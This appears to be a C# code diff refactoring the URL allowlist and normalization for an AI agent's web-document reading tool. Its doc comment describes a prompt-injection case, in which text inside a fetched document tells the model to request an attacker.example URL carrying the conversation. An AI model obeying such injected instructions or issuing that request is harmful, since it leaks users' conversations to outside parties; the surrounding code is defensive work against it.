@@ -18,7 +18,7 @@ public sealed partial class AgentGrain
     /// Agent tool: reads a web-hosted DOCUMENT into this conversation's searchable context. Exposed to
     /// the model as <c>read_web_document</c>; see <c>Skills/websearch/SKILL.md</c> for guidance.
     ///
-    /// <para><b>The allowlist check is a security boundary</b> (see <c>IsFetchableUrl</c>), with the
+    /// <para><b>The allowlist check is a security boundary</b> (see <c>FetchableUrlList.IsFetchable</c>), with the
     /// whole-URL rule: a document's text enters the model's context,
     /// and an instruction written inside it can tell the model to fetch
     /// <c>https://attacker.example/?q=&lt;conversation&gt;</c>. Pinning the exact URL means the model may
@@ -53,7 +53,7 @@ public sealed partial class AgentGrain
             return $"'{url}' is not an absolute http(s) URL, so there is no document to read.";
         }
 
-        if (!IsFetchableUrl(uri))
+        if (!_fetchableUrls.IsFetchable(uri))
         {
             _logger.LogWarning(
                 "Agent grain {GrainKey} refused to read document '{Url}': not a URL from a search result or a user message",
@@ -83,7 +83,7 @@ public sealed partial class AgentGrain
         // tool is model-driven, reachable from /api/agent-run and from a REPEATING reminder, so without this
         // an hourly reminder re-fetches and re-embeds the same PDF forever. The answer is also
         // simply better: the always-on provider (ADR 0008) is already serving this document.
-        if (_state.State.WebDocumentUrls.Contains(Normalize(uri), StringComparer.Ordinal))
+        if (_state.State.WebDocumentUrls.Contains(UrlNormalizer.Normalize(uri), StringComparer.Ordinal))
         {
             return $"I have already read '{url}' into this conversation. Relevant excerpts from it are " +
                 "added to your context automatically, so just answer the question directly — there is no " +
@@ -139,7 +139,7 @@ public sealed partial class AgentGrain
                 "image-only document. Nothing was added to this conversation.";
         }
 
-        await RememberWebDocumentAsync(document.FileName, Normalize(uri));
+        await RememberWebDocumentAsync(document.FileName, UrlNormalizer.Normalize(uri));
 
         var excerpts = await RankIngestedChunksAsync(question, ingested);
 
